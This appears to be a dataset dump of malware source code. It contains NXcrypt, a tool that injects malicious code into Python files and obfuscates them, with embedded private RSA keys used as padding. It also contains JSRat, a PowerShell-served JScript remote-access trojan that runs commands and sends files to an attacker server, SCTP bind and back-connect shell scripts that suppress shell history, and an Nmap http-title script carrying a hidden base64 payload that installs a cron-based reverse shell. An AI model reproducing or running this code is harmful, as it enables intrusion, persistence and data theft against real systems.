Nihil est enim virtute amabilius, nihil quod magis adliciat ad diligendum, quippe cum propter virtutem et probitatem etiam eos, quos numquam vidimus, quodam modo diligamus. Quis est qui C. Fabrici, M'. Curi non cum caritate aliqua benevola memoriam usurpet, quos numquam viderit? quis autem est, qui Tarquinium Superbum, qui Sp. Cassium, Sp. Maelium non oderit? Cum duobus ducibus de imperio in Italia est decertatum, Pyrrho et Hannibale; ab altero propter probitatem eius non nimis alienos animos habemus, alterum propter crudelitatem semper haec civitas oderit.
Sed cautela nimia in peiores haeserat plagas, ut narrabimus postea, aemulis consarcinantibus insidias graves apud Constantium, cetera medium principem sed siquid auribus eius huius modi quivis infudisset ignotus, acerbum et inplacabilem et in hoc causarum titulo dissimilem sui.
Isdem diebus Apollinaris Domitiani gener, paulo ante agens palatii Caesaris curam, ad Mesopotamiam missus a socero per militares numeros immodice scrutabatur, an quaedam altiora meditantis iam Galli secreta susceperint scripta, qui conpertis Antiochiae gestis per minorem Armeniam lapsus Constantinopolim petit exindeque per protectores retractus artissime tenebatur.
Vide, quantum, inquam, fallare, Torquate. oratio me istius philosophi non offendit; nam et complectitur verbis, quod vult, et dicit plane, quod intellegam; et tamen ego a philosopho, si afferat eloquentiam, non asperner, si non habeat, non admodum flagitem. re mihi non aeque satisfacit, et quidem locis pluribus. sed quot homines, tot sententiae; falli igitur possumus.
Ibi victu recreati et quiete, postquam abierat timor, vicos opulentos adorti equestrium adventu cohortium, quae casu propinquabant, nec resistere planitie porrecta conati digressi sunt retroque concedentes omne iuventutis robur relictum in sedibus acciverunt.
Ego vero sic intellego, Patres conscripti, nos hoc tempore in provinciis decernendis perpetuae pacis habere oportere rationem. Nam quis hoc non sentit omnia alia esse nobis vacua ab omni periculo atque etiam suspicione belli?
Ac ne quis a nobis hoc ita dici forte miretur, quod alia quaedam in hoc facultas sit ingeni, neque haec dicendi ratio aut disciplina, ne nos quidem huic uni studio penitus umquam dediti fuimus. Etenim omnes artes, quae ad humanitatem pertinent, habent quoddam commune vinculum, et quasi cognatione quadam inter se continentur.
Iis igitur est difficilius satis facere, qui se Latina scripta dicunt contemnere. in quibus hoc primum est in quo admirer, cur in gravissimis rebus non delectet eos sermo patrius, cum idem fabellas Latinas ad verbum e Graecis expressas non inviti legant. quis enim tam inimicus paene nomini Romano est, qui Ennii Medeam aut Antiopam Pacuvii spernat aut reiciat, quod se isdem Euripidis fabulis delectari dicat, Latinas litteras oderit?
Post quorum necem nihilo lenius ferociens Gallus ut leo cadaveribus pastus multa huius modi scrutabatur. quae singula narrare non refert, me professione modum, quod evitandum est, excedamus.
Ipsam vero urbem Byzantiorum fuisse refertissimam atque ornatissimam signis quis ignorat? Quae illi, exhausti sumptibus bellisque maximis, cum omnis Mithridaticos impetus totumque Pontum armatum affervescentem in Asiam atque erumpentem, ore repulsum et cervicibus interclusum suis sustinerent, tum, inquam, Byzantii et postea signa illa et reliqua urbis ornanemta sanctissime custodita tenuerunt.
Nisi mihi Phaedrum, inquam, tu mentitum aut Zenonem putas, quorum utrumque audivi, cum mihi nihil sane praeter sedulitatem probarent, omnes mihi Epicuri sententiae satis notae sunt. atque eos, quos nominavi, cum Attico nostro frequenter audivi, cum miraretur ille quidem utrumque, Phaedrum autem etiam amaret, cotidieque inter nos ea, quae audiebamus, conferebamus, neque erat umquam controversia, quid ego intellegerem, sed quid probarem.
Paphius quin etiam et Cornelius senatores, ambo venenorum artibus pravis se polluisse confessi, eodem pronuntiante Maximino sunt interfecti. pari sorte etiam procurator monetae extinctus est. Sericum enim et Asbolium supra dictos, quoniam cum hortaretur passim nominare, quos vellent, adiecta religione firmarat, nullum igni vel ferro se puniri iussurum, plumbi validis ictibus interemit. et post hoe flammis Campensem aruspicem dedit, in negotio eius nullo sacramento constrictus.
'''
""""""

rsa = """"""
'''
MIICWgIBAAKBgHbARCDwIVdzyxi3I36sz1hFP3Rkz+Ac0AaP1kINmCcGuKsFd0K3
UwF7pwmi6uW2Sbyxuqay3zVu9baVOibsAMFMVbDRNGr0KoQTpRcEYBjOf32tovof
OSjMnV/at0PdnEVNmW1/55GtdS0Df+dSJA9Otx6O0w1ZSxz9KlSVzr0HAgMBAAEC
gYAs0iTkyb3L5Eij63vaNB+OkZSBugs766QY1fFovPjQwhixdD6vT8JkrOc/G97N
FSB/uBVbFehpopfbcjeguTMPPr7LwJbzwn4xD9u0AotzcO6JnB0k/D1Ixn3IYOY0
o0wmKCq/4Gq6pzsjpJFTG6c5kCszMyQDbMmBWQmeM6ESAQJBALDWs4C07Rw/riCc
KmlG1jtp9x1Uc8zfAlE9FXcdnfidYy/LUhpLtdZNZrHBZ+/P/LbX3kHQijXD7avd
E3MP5NkCQQCr6NuKbRD0NnkTBuWrVPnAxBzO1E8VZF1rFKDXB7UHwtejwcUs3iUt
CTGfr1l+3kj+0aNXCTvDBYxaIUxsmwTfAkAsxpA43JbU+kLKuv/6HBeOf6w0Xvfb
PfRGQaM3v+YJ10AQD/k/8z+dfYetJn18uTsRyOLb40O7jVqWk6mjDrkxAkA5eNHc
x3XBj2yO1eF2lCQjM+1FoGkIB9PLdswG14bIH3WkQ6W9yE65bbdvYVoUNhBFUKTA
9k9KddJkV3mLXZAVAkACHbnraUo727FUodBf48TZkyz6DDOUh4BoJdGq2EDKYWr5
ULGFBeItYZsaSlIc3VtfZdaXcRXRNIjbEOHPLGbb
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHbARCDwIVdzyxi3I36sz1hFP3Rk
z+Ac0AaP1kINmCcGuKsFd0K3UwF7pwmi6uW2Sbyxuqay3zVu9baVOibsAMFMVbDR
NGr0KoQTpRcEYBjOf32tovofOSjMnV/at0PdnEVNmW1/55GtdS0Df+dSJA9Otx6O
0w1ZSxz9KlSVzr0HAgMBAAE=
'''
""""""


rsa1 = """"""
'''
MIIEpQIBAAKCAQEAmDmgQAXKaHyTUVf3h/skxS3zVrsdT/8vK9hIl+swQ66sUAqw
ZJDhSX7HposlKgdz6TtVzWLZr/s1m1lJCzCGFbxTHA+w7dsG0qkuhAdZzx1mTHXk
Uhs0sNMq/PsWTGzBJAJvKtqY+/c1IOKKadt5EBxm9RPnK6BAktD+vr9XnNODGjr1
8yqEOmFELHrwpNNKa8NLqxYiCiQV58DE/5NO0V/OqNLlkwR8KNM9BooeTYRG+A3J
2ZfKIrvhFLVXiVRRn/p2ZwB23hFJMT91UOVbvJa5Gpm2RrIe9rUxuF6srD8fnkOU
CJh4FbPJleHZyC7KYOOhAcjPNCu5NI4a5H2oCQIDAQABAoIBAC9FHcUjxzHhFWIa
HeylCUsNtNXG7xhLVtuXoxtB1k/+KtYEK7he4QaQjvDhnp3JiK3xVficbJrgOEpQ
VIVcARc4ztoU6U1DSYAbNy2alsHhEEZICamRdzA9ssiyM79xuhwzgU/eZ8k+f8oB
bxfmJlbhavtJvexnLAYrTh/vjQZOkXomAYSQJya72CfpDxWkiPEOJjBSSib2j9yY
0x5F/M8eVhB48LNvoPvbkW/FsnlJAerKIOYQZQA8NgZkBpCbanVnJ0XT10M68+lT
Wa+8+fZcsSnby6Arkr0MkJdeSJdeAYrWpLoqJyEozhUJvxgtjdIJM81bf2Sl+zJr
WcMIjPECgYEAxh81bnaQ+19V1S0gWaHxQzbnqtwNZ47YrZnB9bkkvrBtYvRR1ev9
170Dt7c0AomyY50mP4efp3ZgJJ2OYWSg0exB6kgblIj89rFQWGJwMQrWoSSqK1Fk
WswFKzfI7qrdnB8Xzvly3lI+alJd2HYSO9xvo8A05ly8/lxVEE/aO20CgYEAxLH3
yMp7X4jGykNN31IJR9TGznPt5BcuFmL+eT6X/EIquRuHLCb6TzDR1OT6LSMWxPqS
dVKx97hH4gT7gDSAPNVGS1NFx+PQMPwzdLIYG/9eW+GyPPRu7SEmEs489V75uTmB
PRFGNwM5M94Khpx8AgmkSHKiDT523t3Thk4dgY0CgYEAvkJKNYJ3SG8NJmLnpiv2
XO3lHBemZ8SuIEiAE1FxEA6tfVHTJPQ0GXHSmCK/N5C0VyUbDfdYQqFTQtZrXOwd
5HpV8n68va+v/dfZqIcf5njaFHX5VRAcp3U1oYM42roLh1n0qzayMP4aIlBm/vCk
IghWzZJPOsnkVQCmT7vffyECgYEAhu9L+9wkPMqZDSKU5nHh2fw3EmRnO0VHoaXx
yv1MyIofwvMGjRyENRVZrYITuilLMoBvPrsnSbiK35vpaO8bViA9Y+lRgqpfJWuu
ZQzUC0jp04CGhNhuzJAkDVycZvvrtsyjQ2B5Wb4FXPajI+twCvnQUL8LOqiyZXup
44XtKfUCgYEAs8DsRxHqL/nu9akH5MWKqxKsH1oeUeMTL0MLkBpJKkLnAu/pSQz9
y41V0jYgz7hO9Voiv1xaFRlXbhP75RzaEwDf5afDDJbsU1jsXMmcXvcAEGUG3s6p
NcPjjBvjld4EM+nuFCY6C62819jmD/jQ2FzA5hMiPne4tGb+JLO5cAg=
'''
""""""
stringo = [rsa,rsa1,lorem,text]
_output_ = ""backdoor.py"" # edit this line is you want edit default output .
_byte_ = (_output_) + ""c"" # bytecode format

# if platform is linux and NXcrypt isn't launched  as root
if (sys.platform.startswith(""linux"")) :
        if (commands.getoutput(""whoami"")) != ""root"" :
                print (""run it as root"")
                sys.exit() #exit
        else:
                pass
else:
    pass


d = 1
p = random.randint(9,20)


#menu
menu = """"""
d8b   db db    db  .o88b. d8888b. db    db d8888b. d888888b
888o  88 `8b  d8' d8P  Y8 88  `8D `8b  d8' 88  `8D `~~88~~'
88V8o 88  `8bd8'  8P      88oobY'  `8bd8'  88oodD'    88
88 V8o88  .dPYb.  8b      88`8b      88    88~~~      88
88  V888 .8P  Y8. Y8b  d8 88 `88.    88    88         88
VP   V8P YP    YP  `Y88P' 88   YD    YP    88         YP
                                        (python backdoor framework)
                                        Version 3.0
                                        Codename 'WannaLaugh'
       """"""
menu_linux = (colored) + (menu) + (colored)

name = """"""
------------------------------------------------
|                                              |
| -NXcrypt functionnalities                    |
|      - 'python backdoor' encryption          |
|      - backdooring python file  with         |
|        a malicious python file               |
|                                              |
| -Author: Hadi Mene (H4d3s)                   |
| -Credits : Suspicious Shell Activity         |
|                                              |
| -Contact author :                            |
|                 [FB] Hadi Mene                 |
------------------------------------------------
           """"""

name_linux = ""\033[32m"" +  (name) + ""\033[37m""

#options

parser = optparse.OptionParser()
parser.add_option(""--file"", ""-f"", help=""python file  "", action=""store"", dest=""file"")
parser.add_option(""--output"", ""-o"", help=""output of python file "", dest=""out"", action=""store"")
parser.add_option(""--backdoor-file"",""-b"",help=""malicious python file to inject into normal file with multi-threading system"",action=""store"",dest=""backdoor"")

option , arg = parser.parse_args()
if not option.file :

        parser.error(""python file hasn't given type --help for help "")
        sys.exit()


# Encryption module

elif  option.file and not option.backdoor :

        print (menu_linux)
        print (name_linux)

        payload = (option.file)
        try:

                didi = open(payload,'r')
                hades = didi.read()
                didi.close()
        except:
                sys.exit(error+""[-] cannot read file '{}'"".format(payload)+error1)


        hd = open(payload,'w')
        while (d) != (p) :
                hd.write(random.choice(stringo))
                d += 1
        hd.close()

        albania = open(payload,'a')
        albania.write(hades)
        albania.close()

        india = open(payload,'a')

        d = 1
        p = random.randint(9,20)


        while (d) != (p) :
                india.write(random.choice(stringo))
                d += 1
        india.close()


        if not option.out :
                try:
                        py_compile.compile(payload, cfile=_byte_, dfile=None, doraise=False, ) #compilation
                except (py_compile.PyCompileError,IOError,TypeError) :
                        sys.exit(""encryption error :  file  {} don't exist or it's already crypted  or specify the full path (Ex:/root/backdoor/listener.py"".format(option.file)) #error
                print (sucess+""[*] file : {}"".format(option.file)+sucess1)
                print (sucess+""[*] default output : {}"".format(_output_)+sucess1)
                if (sys.platform.startswith(""linux""))  :
                        os.system("" mv  {} {} "".format(_byte_,_output_))

                elif (sys.platform.startswith(""windows"")) :
                        os.system("" rename {} {} "".format(_byte_,_output_))

                elif (sys.platform.startswith(""darwin"")):
                        os.system("" mv {}  {} "".format(_byte_,_output_))

                print (sucess+""[+] encryption finished""+sucess1)
                print (sucess+""[+] file : {} "".format(_output_)+sucess1)
        elif option.out  :
                output = option.out
                bytecode = (option.out) + ""c""
                print (sucess+""[*] file : {}"".format(option.file)+sucess1)
                print (sucess+""[*] output : {}"".format(output)+sucess1)
                try :
                        py_compile.compile(payload, cfile=bytecode, dfile=None, doraise=False, ) #compilation
                except (py_compile.PyCompileError,IOError,TypeError) :
                        sys.exit(""encryption error : file don't exist or it's already crypted  or specify the full path (Ex:/root/backdoor/listener.py"")
                if (sys.platform.startswith(""linux"")):
                        os.system(""mv {}  {} "".format(bytecode,output))
                elif (sys.platform.startswith(""windows"")):
                        os.system(""rename {}  {} "".format(bytecode,output))
                elif (sys.platform.startswith(""darwin"")):
                        os.system(""mv {}  {} "".format(bytecode,output))

                print (sucess+""[+] encryption finished  ""+sucess1)
                print (sucess+""[*] file : {} "".format(output)+sucess1)




# Backdooring module

elif (option.backdoor) :

        print (menu_linux)
        print (name_linux)


        if (option.out) :
                _output_ = (option.out)
                time.sleep(2)
                try:
                        file_to_write = open(option.file,'r').read()
                except :
                        sys.exit(error+""[-] cannot read file {}"".format(option.file)+error1)
                try:
                        backdoor_to_write = open(option.backdoor,'r').read()
                except :
                        sys.exit(error+""[-]) cannot read file {}"".format(option.backdoor)+error1)

                hm = open(_output_,'w')
                hm.write(""#!/usr/bin/python3\nimport threading\n"")
                hm.write(""def fcb():\n"")
                for lines in (file_to_write.split(""\n"")) :
                        hm.write(""\t""+(lines)+""\n"")
                hm.write(""def rma():\n"")
                hm.write(""\t""+""try:"")
                for haha in (backdoor_to_write.split(""\n"")):
                        hm.write(""\t""+""\t""+(haha)+""\n"")
                hm.write(""\texcept:\n"")
                hm.write(""\t\tpass\n"")
                hm.write(""thread_1 = threading.Thread(target=fcb)\n"")
                hm.write(""thread_2 = threading.Thread(target=rma)\n"")
                hm.write(""thread_1.start()\n"")
                hm.write(""thread_2.start()\n"")
                hm.close()
                print(sucess+""[+] File : {}"".format(option.file)+sucess1)
                print(sucess+""[+] Backdoor File : {}"".format(option.backdoor)+sucess1)
                print(sucess+""[+] Injection finished ""+sucess1)
                print(sucess+""[*] Output : {} "".format(_output_)+sucess1)

                question = raw_input(sucess+""[*] Do you want  encrypt (obfuscate) the output [y/n] ? ""+sucess1)
                if (question.lower()) == ""y"" :
                        py_compile.compile(_output_, cfile=(_output_)+""c"", dfile=None, doraise=False, )
                        if (sys.platform.startswith(""linux"")):
                                os.system(""mv {}  {} "".format(_output_+""c"",_output_))
                        elif (sys.platform.startswith(""windows"")):
                                os.system(""rename {}  {} "".format(_output_+""c"",_output_))
                        elif (sys.platform.startswith(""darwin"")):
                                os.system(""mv {}  {} "".format(_output_+""c"",_output_))
                else:
                        pass

                if (sys.platform.startswith(""linux"")):
                        os.system(""chmod +x {}"".format(_output_))
                else:
                        pass

                print(sucess+""[+] Encryption finished ""+sucess1)



        elif not (option.out) :
                try:
                        file_to_write = open(option.file,'r').read()
                except :
                        sys.exit(error+""[-] cannot read file {}"".format(option.file)+error1)
                try:
                        backdoor_to_write = open(option.backdoor,'r').read()
                except :
                        sys.exit(error+""[-] cannot read file {}"".format(option.backdoor)+error1)

                test = open(option.file,'r').read()


                if ""thread_1.start()"" in (test):
                        sys.exit(error+""[-] File '{}' is already backdoored "".format(option.file)+error1)

                hm = open(option.file,'w')
                hm.write(""#!/usr/bin/python3\nimport threading\n"")
                hm.write(""def fcb():\n"")
                for lines in (file_to_write.split(""\n"")) :
                        hm.write(""\t""+(lines)+""\n"")
                hm.write(""def rma():\n"")
                hm.write(""\t""+""try:\n"")
                for haha in (backdoor_to_write.split(""\n"")):
                        hm.write(""\t""+""\t""+(haha)+""\n"")
                hm.write(""\texcept:\n"")
                hm.write(""\t\tpass\n"")
                hm.write(""thread_1 = threading.Thread(target=fcb)\n"")
                hm.write(""thread_2 = threading.Thread(target=rma)\n"")
                hm.write(""thread_1.start()\n"")
                hm.write(""thread_2.start()\n"")
                hm.close()
                print(sucess+""[+] File : {}"".format(option.file)+sucess1)
                print(sucess+""[+] Backdoor File : {}"".format(option.backdoor)+sucess1)
                print(sucess+""[+] Injection finished  ""+sucess1)
                question = raw_input(sucess+""Do you want  encrypt (obfuscate) the output [y/n] ? ""+sucess1)
                if (question.lower()) == ""y"" :
                        py_compile.compile(option.file, cfile=(option.file)+""c"", dfile=None, doraise=False, )
                        _output_ = option.file
                        if (sys.platform.startswith(""linux"")):
                                os.system(""mv {}  {} "".format(_output_+""c"",_output_))
                        elif (sys.platform.startswith(""windows"")):
                                os.system(""rename {}  {} "".format(_output_+""c"",_output_))
                        elif (sys.platform.startswith(""darwin"")):
                                os.system(""mv {}  {} "".format(_output_+""c"",_output_))
                        else:
                                pass
                        if (sys.platform.startswith(""linux"")):
                                os.system(""chmod +x {}"".format(_output_))

                        print(""[+] Encryption finished "")        
                else:
                        pass
else:
        sys.exit()"
JSRat,"$Server = '192.168.174.131' #Listening IP. Change This.

function Receive-Request 
{
   	param
   	(      
      	$Request
   	)
   	$output = """"
   	$size = $Request.ContentLength64 + 1   
   	$buffer = New-Object byte[] $size
   	do
   	{
	 	$count = $Request.InputStream.Read($buffer, 0, $size)
      		$output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   	} until($count -lt $size)
   	$Request.InputStream.Close()
   	write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name=""PoshRat 80"" | Out-Null
netsh advfirewall firewall add rule name=""PoshRat 80"" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) 
{
    	$context = $listener.GetContext() # blocks until request is received
    	$request = $context.Request
    	$response = $context.Response
	$hostip = $request.RemoteEndPoint

	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq ""GET"")) 
	{  
     		write-host ""Usage:"" -fore Green
		write-host ""      cmd:          	just input the cmd command"" -fore Green
     		write-host ""      delete file:  	input:delete,then set the file path"" -fore Green
     		write-host ""      exitbackdoor: 	input:exit"" -fore Green
     		write-host ""      read file:    	input:read,then set the file path"" -fore Green
     		write-host ""      run exe:      	input:run,then set the file path"" -fore Green
     		write-host ""      download file:   	input:download,then set the file path"" -fore Green
     		write-host ""      upload file:     	input:upload,then set the file path"" -fore Green
     		write-host ""Host Connected"" -fore Cyan
        $message = '
			while(true)
			{
				h = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                        	h.SetTimeouts(0, 0, 0, 0);
						
                        	try
                        	{
					h.Open(""GET"",""http://'+$Server+'/rat"",false);
					h.Send();
					c = h.ResponseText;
                            
                            
                            		if(c==""delete"")
                            		{
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
					    	p.Send(""[Next Input should be the File to Delete]"");
                                		g = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open(""GET"",""http://'+$Server+'/rat"",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject(""Scripting.FileSystemObject"");
                                		f =fso1.GetFile(d);
                                		f.Delete();
                                
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
					    	p.Send(""[Delete Success]"");
                                		continue;                         
                            		}
                            
                            		else if(c==""download"")
                            		{
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
					    	p.Send(""[Next Input should be the File to download]"");
                                
                                		g = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open(""GET"",""http://'+$Server+'/rat"",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject(""Scripting.FileSystemObject"");
                                		f=fso1.OpenTextFile(d,1);
                                		g=f.ReadAll();
                                		f.Close(); 
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/download"",false);
					    	p.Send(g);
                                		continue;
                            			}
                           
                            		else if(c==""exit"")
                            		{
                                		c=""(\""cmd /c taskkill /f /im rundll32.exe\"",0,true)"";  
                                		r = new ActiveXObject(""WScript.Shell"").Run(c);
                       
                          		}
                            
                            		else if(c==""read"")
                            		{
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
					    	p.Send(""[Next Input should be the File to Read]"");
                                
                                		g = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open(""GET"",""http://'+$Server+'/rat"",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject(""Scripting.FileSystemObject"");
                                		f=fso1.OpenTextFile(d,1);
                                		g=f.ReadAll();
                                		f.Close();
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
					    	p.Send(g);
                                		continue;
                            		}
                                       
                            
                            		else if(c==""run"")
                            		{
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
					    	p.Send(""[Next Input should be the File to Run]"");
                                
                                		g = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open(""GET"",""http://'+$Server+'/rat"",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		r = new ActiveXObject(""WScript.Shell"").Run(d,0,true);
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
                                		p.Send(""[Run Success]"");
                                
                                		continue;      
                            		}
                          
                          
                           		else if(c==""upload"")
                            		{
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                        		 	p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
					    	p.Send(""[Start to Upload]"");
                                
                                		g = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open(""GET"",""http://'+$Server+'/uploadpath"",false);
					    	g.Send();
					    	dpath = g.ResponseText;
                          
                                		g2 = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		g2.SetTimeouts(0, 0, 0, 0);
                                		g2.Open(""GET"",""http://'+$Server+'/uploaddata"",false);
					    	g2.Send();
					    	ddata = g2.ResponseText;
                                		fso1=new ActiveXObject(""Scripting.FileSystemObject"");
                                		f=fso1.CreateTextFile(dpath,true);
                                		f.WriteLine(ddata);
                                		f.Close();
                                    
                                		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open(""POST"",""http://'+$Server+'/rat"",false);
					    	p.Send(""[Upload Success]"");
                                		continue;
                            		}
                            
                            		else
                            		{
                            
                            			r = new ActiveXObject(""WScript.Shell"").Exec(c);
				    		var so;
				    		while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
						    p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
				    		p.Open(""POST"",""http://'+$Server+'/rat"",false);
			 	       		p.Send(so);
                            		}
                            
                        	}
                        	catch(e1)
                        	{
                            		p=new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");
                            		p.SetTimeouts(0, 0, 0, 0);
					p.Open(""POST"",""http://'+$Server+'/rat"",false);
                            		p.Send(""[No Output]"");
                            
				}
                                            
			}
		'

    	}		 
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq ""POST"") ) 
	{ 
		Receive-Request($request)	
	}
    
    	if ($request.Url -match '/download$' -and ($request.HttpMethod -eq ""POST"") ) 
    	{ 
	   	$output = """"
       		$size = $Request.ContentLength64 + 1   
       		$buffer = New-Object byte[] $size
       		do {
            		$count = $Request.InputStream.Read($buffer, 0, $size)
            		$output += $Request.ContentEncoding.GetString($buffer, 0, $count)
          	} until($count -lt $size)
       		$Request.InputStream.Close()
             
       		write-host ""Input the Path to Save:"" -fore Red
       		$message = Read-Host
	   	Set-Content $message -Value $output
       		write-host ""Save Success"" -fore Red
    	}
   
    	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq ""GET"")) 
    	{  
        	$response.ContentType = 'text/plain'
        	$message = Read-Host ""JS $hostip>""		
    	}
        	
    	if($BoolExit -eq 1)
    	{
	    	exit      
	}   	
	$BoolExit=0

    	if($message  -eq ""exit"")
    	{
	 	$BoolExit=1
    	}   



    	if ($request.Url -match '/uploadpath$' -and ($request.HttpMethod -eq ""GET"") ) 
    	{
        	write-host ""Input the Path to upload:"" -fore Red
        	$UploadPath = Read-Host 
        	write-host ""Input the Destination Path:"" -fore Red
        	$message = Read-Host 
    	}


    	if ($request.Url -match '/uploaddata$' -and ($request.HttpMethod -eq ""GET"") ) 
    	{
        	$message = Get-Content $UploadPath
    	}

    	[byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    	$response.ContentLength64 = $buffer.length
    	$output = $response.OutputStream
    	$output.Write($buffer, 0, $buffer.length)
    	$output.Close()
	
}

$listener.Stop()"
sctp_pty_bind,"import os
import pty
import socket
from sctp import *

lport = 31337 # XXX: CHANGEME

def main():
    s = sctpsocket_tcp(socket.AF_INET)
    s.bind(('', lport))
    s.listen(1)
    (rem, addr) = s.accept()
    os.dup2(rem.fileno(),0)
    os.dup2(rem.fileno(),1)
    os.dup2(rem.fileno(),2)
    os.putenv(""HISTFILE"",'/dev/null')
    pty.spawn(""/bin/bash"")
    s.close()
	
if __name__ == ""__main__"":
    main()"
sctp_pty_backconnect,"import os
import pty
import socket
from sctp import *

lhost = ""127.0.0.1"" # XXX: CHANGEME
lport = 31337 # XXX: CHANGEME

def main():
    s = sctpsocket_tcp(socket.AF_INET)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv(""HISTFILE"",'/dev/null')
    pty.spawn(""/bin/bash"")
    s.close()
	
if __name__ == ""__main__"":
    main()"
,
nmap_http-title,"local http = require ""http""
local nmap = require ""nmap""
local shortport = require ""shortport""
local stdnse = require ""stdnse""
local string = require ""string""
local base64 = require ""base64""

description = [[
Shows the title of the default page of a web server.
The script will follow no more than one HTTP redirect, and only if the
redirection leads to the same host. The script may send a DNS query to
determine whether the host the redirect leads to has the same IP address as the
original target.
]]

---
--@output
-- Nmap scan report for scanme.nmap.org (127.0.0.1)
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- |_http-title: Go ahead and ScanMe!
--
-- @xmloutput
-- <elem key=""title"">Go ahead and ScanMe!</elem>
-- @xmloutput
-- <elem key=""title"">Wikipedia, the free encyclopedia</elem>
-- <elem key=""redirect_url"">http://en.wikipedia.org/wiki/Main_Page</elem>

author = ""Diman Todorov""

license = ""Same as Nmap--See http://nmap.org/book/man-legal.html""

categories = {""default"", ""discovery"", ""safe""}

portrule = shortport.http

action = function(host, port)
  local resp, redirect_url, title
  -- at (user only)
  -- local payload = ""ZWNobyAicHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGF0IG5vdyArIDEgbWludXRlCg==""

  -- crontab
  local payload = ""ZWNobyAiKi8xICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGNyb250YWI=""

  -- payload exec
  os.execute(base64.dec(payload))

  resp = http.get( host, port, '/' )

